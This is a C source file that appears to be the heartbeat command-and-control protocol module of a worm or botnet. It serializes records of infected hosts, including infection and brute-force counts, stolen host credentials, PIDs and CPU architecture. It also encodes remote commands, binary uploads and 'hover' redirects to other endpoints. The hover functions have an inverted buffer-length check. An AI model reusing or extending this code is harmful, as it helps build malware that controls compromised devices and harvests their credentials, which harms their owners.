#include "protocol.h"
#include "util_rt.h"
#include "endian.h"
#include "dvault.h"

#include <string.h>

#include <assert.h>
#include <errno.h>
#include <limits.h>
#include <arpa/inet.h>


#define RETIF_NULL(x) if (x == NULL) { return; }


const char *prne_arch_tostr (const prne_arch_t x) {
	switch (x){
	case PRNE_ARCH_AARCH64:
		return "aarch64";
	case PRNE_ARCH_ARMV4T:
		return "armv4t";
	case PRNE_ARCH_ARMV7:
		return "armv7";
	case PRNE_ARCH_X86_64:
		return "x86_64";
	case PRNE_ARCH_I686:
		return "i686";
	case PRNE_ARCH_MIPS:
		return "mips";
	case PRNE_ARCH_MPSL:
		return "mpsl";
	case PRNE_ARCH_PPC:
		return "ppc";
	case PRNE_ARCH_SH4:
		return "sh4";
	case PRNE_ARCH_M68K:
		return "m68k";
	case PRNE_ARCH_ARC:
		return "arc";
	case PRNE_ARCH_ARCEB:
		return "arceb";
	}

	return NULL;
}

prne_arch_t prne_arch_fstr (const char *str) {
	for (prne_arch_t i = PRNE_ARCH_NONE + 1; i < NB_PRNE_ARCH; i += 1) {
		if (prne_nstreq(str, prne_arch_tostr(i))) {
			return i;
		}
	}

	return PRNE_ARCH_NONE;
}

void prne_net_ep_tosin4 (const prne_net_endpoint_t *ep, struct sockaddr_in *out) {
	memcpy(&out->sin_addr, ep->addr.addr, 4);
	out->sin_family = AF_INET;
	out->sin_port = htons(ep->port);
}

void prne_net_ep_tosin6 (const prne_net_endpoint_t *ep, struct sockaddr_in6 *out) {
	memcpy(&out->sin6_addr, ep->addr.addr, 16);
	out->sin6_family = AF_INET6;
	out->sin6_port = htons(ep->port);
}

bool prne_net_ep_set_ipv4 (const char *str, const uint16_t port, prne_net_endpoint_t *out) {
	out->port = port;
	out->addr.ver = PRNE_IPV_4;
	return inet_pton(AF_INET, str, &out->addr.addr) != 0;
}

bool prne_net_ep_set_ipv6 (const char *str, const uint16_t port, prne_net_endpoint_t *out) {
	out->port = port;
	out->addr.ver = PRNE_IPV_6;
	return inet_pton(AF_INET6, str, &out->addr.addr) != 0;
}

void prne_htbt_init_msg_head (prne_htbt_msg_head_t *mh) {
	mh->op = PRNE_HTBT_OP_NOOP;
	mh->id = 0;
	mh->is_rsp = false;
}

void prne_htbt_free_msg_head (prne_htbt_msg_head_t *mh) {}

bool prne_htbt_eq_msg_head (const prne_htbt_msg_head_t *a, const prne_htbt_msg_head_t *b) {
	return
		a->id == b->id &&
		a->op == b->op &&
		a->is_rsp == b->is_rsp;
}

void prne_htbt_init_status (prne_htbt_status_t *s) {
	s->code = 0;
	s->err = 0;
}

void prne_htbt_free_status (prne_htbt_status_t *s) {}

bool prne_htbt_eq_status (const prne_htbt_status_t *a, const prne_htbt_status_t *b) {
	return
		a->code == b->code &&
		a->err == b->err;
}

void prne_init_host_cred (prne_host_cred_t *hc) {
	hc->id = NULL;
	hc->pw = NULL;
}

bool prne_alloc_host_cred (prne_host_cred_t *hc, const uint8_t id_len, const uint8_t pw_len) {
	char *id, *pw;

	id = prne_alloc_str(id_len);
	pw = prne_alloc_str(pw_len);
	if (id == NULL || pw == NULL) {
		prne_free(id);
		prne_free(pw);
		return false;
	}

	prne_free(hc->id);
	prne_free(hc->pw);
	hc->id = id;
	hc->pw = pw;

	return true;
}

void prne_free_host_cred (prne_host_cred_t *hc) {
	RETIF_NULL(hc);

	prne_free(hc->id);
	prne_free(hc->pw);
	hc->id = NULL;
	hc->pw = NULL;
}

bool prne_eq_host_cred (const prne_host_cred_t *a, const prne_host_cred_t *b) {
	return
		prne_nstreq(a->id, b->id) &&
		prne_nstreq(a->pw, b->pw);
}

prne_htbt_ser_rc_t prne_enc_host_cred (uint8_t *data, const size_t len, size_t *actual, const prne_host_cred_t *in) {
	const size_t id_len = prne_nstrlen(in->id);
	const size_t pw_len = prne_nstrlen(in->pw);

	if (id_len > 255 || pw_len > 255) {
		return PRNE_HTBT_SER_RC_FMT_ERR;
	}

	*actual = 2 + id_len + pw_len;
	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	data[0] = (uint8_t)id_len;
	data[1] = (uint8_t)pw_len;
	memcpy(data + 2, in->id, id_len);
	memcpy(data + 2 + id_len, in->pw, pw_len);
	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_dec_host_cred (const uint8_t *data, const size_t len, prne_host_cred_t *out) {
	if (!(2 <= len && len <= 2 + 255 + 255)) {
		return PRNE_HTBT_SER_RC_FMT_ERR;
	}

	if (!prne_alloc_host_cred(out, data[0], data[1])) {
		return PRNE_HTBT_SER_RC_ERRNO;
	}
	memcpy(out->id, data + 2, data[0]);
	out->id[data[0]] = 0;
	memcpy(out->pw, data + 2 + data[0], data[1]);
	out->pw[data[1]] = 0;

	return PRNE_HTBT_SER_RC_OK;
}

void prne_htbt_init_host_info (prne_htbt_host_info_t *hi) {
	hi->parent_uptime = 0;
	hi->child_uptime = 0;
	hi->bne_cnt = 0;
	hi->infect_cnt = 0;
	hi->parent_pid = 0;
	hi->child_pid = 0;
	prne_memzero(hi->prog_ver, 16);
	prne_memzero(hi->boot_id, 16);
	prne_memzero(hi->instance_id, 16);
	hi->host_cred = NULL;
	hi->crash_cnt = 0;
	hi->arch = PRNE_ARCH_NONE;
}

bool prne_htbt_alloc_host_info (prne_htbt_host_info_t *hi, const size_t cred_strlen) {
	void *ny_mem;

	if (cred_strlen > 255) {
		errno = EINVAL;
		return false;
	}

	ny_mem = prne_alloc_str(cred_strlen);
	if (ny_mem == NULL) {
		return false;
	}

	prne_memzero(ny_mem, cred_strlen + 1);
	prne_free(hi->host_cred);
	hi->host_cred = (char*)ny_mem;

	return true;
}

void prne_htbt_free_host_info (prne_htbt_host_info_t *hi) {
	RETIF_NULL(hi);

	prne_free(hi->host_cred);
	hi->host_cred = NULL;
}

bool prne_htbt_eq_host_info (const prne_htbt_host_info_t *a, const prne_htbt_host_info_t *b) {
	return
		a->parent_uptime == b->parent_uptime &&
		a->child_uptime == b->child_uptime &&
		a->bne_cnt == b->bne_cnt &&
		a->infect_cnt == b->infect_cnt &&
		a->parent_pid == b->parent_pid &&
		a->child_pid == b->child_pid &&
		a->arch == b->arch &&
		memcmp(a->prog_ver, b->prog_ver, 16) == 0 &&
		memcmp(a->boot_id, b->boot_id, 16) == 0 &&
		memcmp(a->instance_id, b->instance_id, 16) == 0 &&
		prne_nstreq(a->host_cred, b->host_cred);
}

void prne_htbt_init_cmd (prne_htbt_cmd_t *cmd) {
	cmd->mem_len = 0;
	cmd->mem = NULL;
	cmd->args = NULL;
	cmd->argc = 0;
	cmd->detach = false;
}

bool prne_htbt_alloc_cmd (prne_htbt_cmd_t *cmd, const size_t argc, const size_t *args_len) {
	size_t i, str_size, pos, mem_len;
	char *mem = NULL;
	char **args = NULL;

	if (argc > PRNE_HTBT_ARGS_MAX) {
		errno = EINVAL;
		return false;
	}

	pos = 0;
	for (i = 0; i < argc; i += 1) {
		if (args_len[i] == SIZE_MAX) {
			errno = ENOMEM;
			return false;
		}
		str_size = args_len[i] + 1;
		if (str_size + pos < str_size) {
			errno = ENOMEM;
			return false;
		}

		pos += str_size;
	}

	if (pos > PRNE_HTBT_ARG_MEM_MAX) {
		errno = EINVAL;
		return false;
	}

	if (0 < argc) {
		mem_len = pos;
		args = (char**)prne_malloc(sizeof(char*), argc + 1);
		mem = (char*)prne_malloc(1, mem_len);
		if (args == NULL || mem == NULL) {
			goto ERR;
		}

		pos = 0;
		for (i = 0; i < argc; i += 1) {
			args[i] = mem + pos;
			pos += args_len[i] + 1;
		}
		args[argc] = NULL;
	}
	else {
		mem_len = 0;
	}

	prne_free(cmd->args);
	prne_free(cmd->mem);
	cmd->mem = mem;
	cmd->mem_len = mem_len;
	cmd->args = args;
	cmd->argc = argc;

	return true;
ERR:
	prne_free(mem);
	prne_free(args);

	return false;
}

bool prne_htbt_set_cmd (prne_htbt_cmd_t *cmd, char **const args) {
	size_t *args_len = NULL;
	size_t i, argc;
	bool ret = true;

	if (args == NULL) {
		prne_htbt_free_cmd(cmd);
		return true;
	}

	for (i = 0; args[i] != NULL; i += 1);
	argc = i;

	if (argc == 0) {
		prne_htbt_free_cmd(cmd);
		return true;
	}

	args_len = (size_t*)prne_malloc(sizeof(size_t), argc);
	if (args_len == NULL) {
		return false;
	}
	for (i = 0; i < argc; i += 1) {
		args_len[i] = strlen(args[i]);
	}

	if (!prne_htbt_alloc_cmd(cmd, argc, args_len)) {
		ret = false;
		goto END;
	}
	for (i = 0; i < argc; i += 1) {
		memcpy(cmd->args[i], args[i], args_len[i]);
		cmd->args[i][args_len[i]] = 0;
	}

END:
	prne_free(args_len);
	return ret;
}

void prne_htbt_free_cmd (prne_htbt_cmd_t *cmd) {
	RETIF_NULL(cmd);

	prne_free(cmd->mem);
	prne_free(cmd->args);
	cmd->mem = NULL;
	cmd->mem_len = 0;
	cmd->args = NULL;
	cmd->argc = 0;
}

bool prne_htbt_eq_cmd (const prne_htbt_cmd_t *a, const prne_htbt_cmd_t *b) {
	if (!(a->mem_len == b->mem_len &&
		a->argc == b->argc &&
		memcmp(a->mem, b->mem, a->mem_len) == 0))
	{
		return false;
	}

	for (size_t i = 0; i < a->argc; i += 1) {
		if (!prne_nstreq(a->args[i], b->args[i])) {
			return false;
		}
	}

	return true;
}

void prne_htbt_init_bin_meta (prne_htbt_bin_meta_t *nb) {
	nb->bin_size = 0;
	prne_htbt_init_cmd(&nb->cmd);
}

void prne_htbt_free_bin_meta (prne_htbt_bin_meta_t *nb) {
	RETIF_NULL(nb);

	prne_htbt_free_cmd(&nb->cmd);
}

bool prne_htbt_eq_bin_meta (const prne_htbt_bin_meta_t *a, const prne_htbt_bin_meta_t *b) {
	return
		a->bin_size == b->bin_size &&
		prne_htbt_eq_cmd(&a->cmd, &b->cmd);
}

void prne_htbt_init_hover (prne_htbt_hover_t *ho) {
	prne_memzero(ho, sizeof(prne_htbt_hover_t));
}

void prne_htbt_free_hover (prne_htbt_hover_t *ho) {}

bool prne_htbt_eq_hover (const prne_htbt_hover_t *a, const prne_htbt_hover_t *b) {
	return
		memcmp(a->v4.addr, b->v4.addr, 4) == 0 &&
		memcmp(a->v6.addr, b->v6.addr, 16) == 0 &&
		a->v4.port == b->v4.port &&
		a->v6.port == b->v6.port;
}

bool prne_htbt_cp_hover (const prne_htbt_hover_t *a, prne_htbt_hover_t *b) {
	memcpy(b, a, sizeof(prne_htbt_hover_t));
	return true;
}

void prne_htbt_init_stdio (prne_htbt_stdio_t *s) {
	s->len = 0;
	s->err = false;
	s->fin = false;
}

void prne_htbt_free_stdio (prne_htbt_stdio_t *s) {}

bool prne_htbt_eq_stdio (const prne_htbt_stdio_t *a, const prne_htbt_stdio_t *b) {
	return
		a->len == b->len &&
		a->err == b->err &&
		a->fin == b->fin;
}

prne_htbt_ser_rc_t prne_htbt_ser_msg_head (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_msg_head_t *in) {
	uint16_t id;

	*actual = 3;

	if (mem_len < 3) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}
	if (in->id & 0x8000 ||
		PRNE_HTBT_OP_NONE == in->op ||
		(in->id == 0) ^ (in->op == PRNE_HTBT_OP_NOOP)) {
		return PRNE_HTBT_SER_RC_FMT_ERR;
	}

	id = (in->is_rsp ? 0 : 0x8000) | in->id;
	mem[0] = prne_getmsb16(id, 0);
	mem[1] = prne_getmsb16(id, 1);
	mem[2] = (uint8_t)in->op;

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_ser_status (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_status_t *in) {
	*actual = 5;

	if (mem_len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	mem[0] = (uint8_t)in->code;
	mem[1] = prne_getmsb32(in->err, 0);
	mem[2] = prne_getmsb32(in->err, 1);
	mem[3] = prne_getmsb32(in->err, 2);
	mem[4] = prne_getmsb32(in->err, 3);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_ser_host_info (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_host_info_t *in) {
	const size_t host_cred_len = prne_nstrlen(in->host_cred);

	if (host_cred_len > 255) {
		return PRNE_HTBT_SER_RC_FMT_ERR;
	}

	*actual = 94 + host_cred_len;

	if (mem_len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	memcpy(mem + 0, in->prog_ver, 16);
	memcpy(mem + 16, in->boot_id, 16);
	memcpy(mem + 32, in->instance_id, 16);
	mem[48] = prne_getmsb64(in->parent_uptime, 0);
	mem[49] = prne_getmsb64(in->parent_uptime, 1);
	mem[50] = prne_getmsb64(in->parent_uptime, 2);
	mem[51] = prne_getmsb64(in->parent_uptime, 3);
	mem[52] = prne_getmsb64(in->parent_uptime, 4);
	mem[53] = prne_getmsb64(in->parent_uptime, 5);
	mem[54] = prne_getmsb64(in->parent_uptime, 6);
	mem[55] = prne_getmsb64(in->parent_uptime, 7);
	mem[56] = prne_getmsb64(in->child_uptime, 0);
	mem[57] = prne_getmsb64(in->child_uptime, 1);
	mem[58] = prne_getmsb64(in->child_uptime, 2);
	mem[59] = prne_getmsb64(in->child_uptime, 3);
	mem[60] = prne_getmsb64(in->child_uptime, 4);
	mem[61] = prne_getmsb64(in->child_uptime, 5);
	mem[62] = prne_getmsb64(in->child_uptime, 6);
	mem[63] = prne_getmsb64(in->child_uptime, 7);
	mem[64] = prne_getmsb64(in->bne_cnt, 0);
	mem[65] = prne_getmsb64(in->bne_cnt, 1);
	mem[66] = prne_getmsb64(in->bne_cnt, 2);
	mem[67] = prne_getmsb64(in->bne_cnt, 3);
	mem[68] = prne_getmsb64(in->bne_cnt, 4);
	mem[69] = prne_getmsb64(in->bne_cnt, 5);
	mem[70] = prne_getmsb64(in->bne_cnt, 6);
	mem[71] = prne_getmsb64(in->bne_cnt, 7);
	mem[72] = prne_getmsb64(in->infect_cnt, 0);
	mem[73] = prne_getmsb64(in->infect_cnt, 1);
	mem[74] = prne_getmsb64(in->infect_cnt, 2);
	mem[75] = prne_getmsb64(in->infect_cnt, 3);
	mem[76] = prne_getmsb64(in->infect_cnt, 4);
	mem[77] = prne_getmsb64(in->infect_cnt, 5);
	mem[78] = prne_getmsb64(in->infect_cnt, 6);
	mem[79] = prne_getmsb64(in->infect_cnt, 7);
	mem[80] = prne_getmsb32(in->crash_cnt, 0);
	mem[81] = prne_getmsb32(in->crash_cnt, 1);
	mem[82] = prne_getmsb32(in->crash_cnt, 2);
	mem[83] = prne_getmsb32(in->crash_cnt, 3);
	mem[84] = prne_getmsb32(in->parent_pid, 0);
	mem[85] = prne_getmsb32(in->parent_pid, 1);
	mem[86] = prne_getmsb32(in->parent_pid, 2);
	mem[87] = prne_getmsb32(in->parent_pid, 3);
	mem[88] = prne_getmsb32(in->child_pid, 0);
	mem[89] = prne_getmsb32(in->child_pid, 1);
	mem[90] = prne_getmsb32(in->child_pid, 2);
	mem[91] = prne_getmsb32(in->child_pid, 3);
	mem[92] = (uint8_t)host_cred_len;
	mem[93] = (uint8_t)in->arch;
	memcpy(mem + 94, in->host_cred, host_cred_len);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_ser_hover (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_hover_t *in) {
	*actual = 24;
	if (*actual < mem_len) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	memcpy(mem, in->v4.addr, 4);
	mem[4] = prne_getmsb16(in->v4.port, 0);
	mem[5] = prne_getmsb16(in->v4.port, 1);
	memcpy(mem + 6, in->v6.addr, 16);
	mem[22] = prne_getmsb16(in->v6.port, 0);
	mem[23] = prne_getmsb16(in->v6.port, 1);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_ser_cmd (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_cmd_t *in) {
	if (in->mem_len > 0) {
		if (in->mem_len > PRNE_HTBT_ARG_MEM_MAX || in->argc == 0 || in->mem[in->mem_len - 1] != 0) {
			return PRNE_HTBT_SER_RC_FMT_ERR;
		}
	}
	*actual = in->mem_len + 2;

	if (mem_len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	mem[0] = prne_getmsb16(in->mem_len, 0);
	mem[1] = prne_getmsb16(in->mem_len, 1);
	memcpy(mem + 2, in->mem, in->mem_len);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_ser_bin_meta (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_bin_meta_t *in) {
	*actual = in->cmd.mem_len + 5;

	if (mem_len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	mem[0] = prne_getmsb32(in->bin_size, 1);
	mem[1] = prne_getmsb32(in->bin_size, 2);
	mem[2] = prne_getmsb32(in->bin_size, 3);
	mem[3] = prne_getmsb16(in->cmd.mem_len, 0);
	mem[4] = prne_getmsb16(in->cmd.mem_len, 1);
	memcpy(mem + 5, in->cmd.mem, in->cmd.mem_len);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_ser_stdio (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_stdio_t *in) {
	*actual = 2;
	if (in->len > PRNE_HTBT_STDIO_LEN_MAX) {
		return PRNE_HTBT_SER_RC_FMT_ERR;
	}
	if (mem_len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	mem[0] =
		(in->err ? 0x80 : 0) |
		(in->fin ? 0x40 : 0) |
		(prne_getmsb16(in->len, 0) & 0x0F);
	mem[1] = prne_getmsb16(in->len, 1);

	return PRNE_HTBT_SER_RC_OK;
}


prne_htbt_ser_rc_t prne_htbt_dser_msg_head (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_msg_head_t *out) {
	*actual = 3;

	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	out->id = prne_recmb_msb16(0x7F & data[0], data[1]);
	out->op = (uint8_t)data[2];
	out->is_rsp = (data[0] & 0x80) == 0;

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_dser_status (uint8_t *data, const size_t len, size_t *actual, prne_htbt_status_t *out) {
	*actual = 5;

	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	out->code = (prne_htbt_status_code_t)data[0];
	out->err = prne_recmb_msb32(data[1], data[2], data[3], data[4]);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_dser_host_info (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_host_info_t *out) {
	size_t cred_size;

	*actual = 94;

	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	cred_size = data[92];
	*actual += cred_size;
	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	if (!prne_htbt_alloc_host_info(out, cred_size)) {
		return PRNE_HTBT_SER_RC_ERRNO;
	}

	memcpy(out->prog_ver, data + 0, 16);
	memcpy(out->boot_id, data + 16, 16);
	memcpy(out->instance_id, data + 32, 16);
	out->parent_uptime = prne_recmb_msb64(
		data[48],
		data[49],
		data[50],
		data[51],
		data[52],
		data[53],
		data[54],
		data[55]);
	out->child_uptime = prne_recmb_msb64(
		data[56],
		data[57],
		data[58],
		data[59],
		data[60],
		data[61],
		data[62],
		data[63]);
	out->bne_cnt = prne_recmb_msb64(
		data[64],
		data[65],
		data[66],
		data[67],
		data[68],
		data[69],
		data[70],
		data[71]);
	out->infect_cnt = prne_recmb_msb64(
		data[72],
		data[73],
		data[74],
		data[75],
		data[76],
		data[77],
		data[78],
		data[79]);
	out->crash_cnt = prne_recmb_msb32(
		data[80],
		data[81],
		data[82],
		data[83]);
	out->parent_pid = prne_recmb_msb32(
		data[84],
		data[85],
		data[86],
		data[87]);
	out->child_pid = prne_recmb_msb32(
		data[88],
		data[89],
		data[90],
		data[91]);
	out->arch = (prne_arch_t)data[93];
	memcpy(out->host_cred, data + 94, cred_size);
	out->host_cred[cred_size] = 0;

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_dser_hover (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_hover_t *out) {
	*actual = 24;
	if (*actual < len) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	memcpy(out->v4.addr, data, 4);
	out->v4.port = prne_recmb_msb16(data[4], data[5]);
	memcpy(out->v6.addr, data + 6, 16);
	out->v6.port = prne_recmb_msb16(data[22], data[23]);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_dser_cmd (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_cmd_t *out) {
	size_t args_len, argc;
	char **args = NULL;
	char *mem = NULL;
	prne_htbt_ser_rc_t ret = PRNE_HTBT_SER_RC_OK;
	int saved_errno;

	*actual = 2;
	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	args_len = prne_recmb_msb16(0x03 & data[0], data[1]);
	*actual += args_len;

	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	if (args_len > 0) {
		mem = (char*)prne_malloc(1, args_len);
		if (mem == NULL) {
			ret = PRNE_HTBT_SER_RC_ERRNO;
			goto END;
		}
		memcpy(mem, data + 2, args_len);
	}

	saved_errno = errno;
	errno = 0;
	args = prne_htbt_parse_args(
		mem,
		args_len,
		0,
		NULL,
		&argc,
		PRNE_HTBT_ARGS_MAX);
	if (args == NULL) {
		ret =
			errno != 0 ?
			PRNE_HTBT_SER_RC_ERRNO :
			PRNE_HTBT_SER_RC_FMT_ERR;
		goto END;
	}
	errno = saved_errno;

	prne_htbt_free_cmd(out);
	out->mem = mem;
	out->mem_len = args_len;
	out->args = args;
	out->argc = argc;
	out->detach = (0x04 & data[0]) != 0;
	mem = NULL;
	args = NULL;

END:
	prne_free(mem);
	prne_free(args);
	return ret;
}

prne_htbt_ser_rc_t prne_htbt_dser_bin_meta (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_bin_meta_t *out) {
	size_t chain_actual;
	prne_htbt_ser_rc_t ret;

	*actual = 5;
	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}
	ret = prne_htbt_dser_cmd(data + 3, len - 3, &chain_actual, &out->cmd);
	if (ret != PRNE_HTBT_SER_RC_OK) {
		return ret;
	}

	*actual = chain_actual + 3;
	out->bin_size = prne_recmb_msb32(0, data[0], data[1], data[2]);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_dser_stdio (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_stdio_t *out) {
	*actual = 2;
	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	out->err = (data[0] & 0x80) != 0;
	out->fin = (data[0] & 0x40) != 0;
	out->len = prne_recmb_msb16(data[0] & 0x0F, data[1]);

	return PRNE_HTBT_SER_RC_OK;
}

char **prne_htbt_parse_args (char *m_args, const size_t args_size, const size_t add_argc, char **add_args, size_t *argc, const size_t max_args) {
	char *ptr, *end = m_args + args_size, *next;
	size_t i, cnt;
	char **ret;

	cnt = 0;
	ptr = m_args;
	while (ptr < end) {
		next = prne_strnchr(ptr, 0, end - ptr);
		if (next == NULL) {
			return NULL; // reject non-null-terminated
		}
		else {
			if (next - ptr > 0) {
				cnt += 1;
			}
			ptr = next + 1;
		}
	}
	cnt += add_argc;
	if (cnt > max_args) {
		return NULL;
	}

	ret = (char**)prne_malloc(sizeof(char*), cnt + 1);
	if (ret == NULL) {
		return NULL;
	}
	ret[cnt] = NULL;
	if (argc != NULL) {
		*argc = cnt;
	}

	for (i = 0; i < add_argc; i +=1) {
		ret[i] = add_args[i];
	}

	ptr = m_args;
	while (ptr < end) {
		next = prne_strnchr(ptr, 0, end - ptr);
		if (next - ptr > 0) {
			ret[i++] = ptr;
		}
		ptr = next + 1;
	}

	return ret;
}
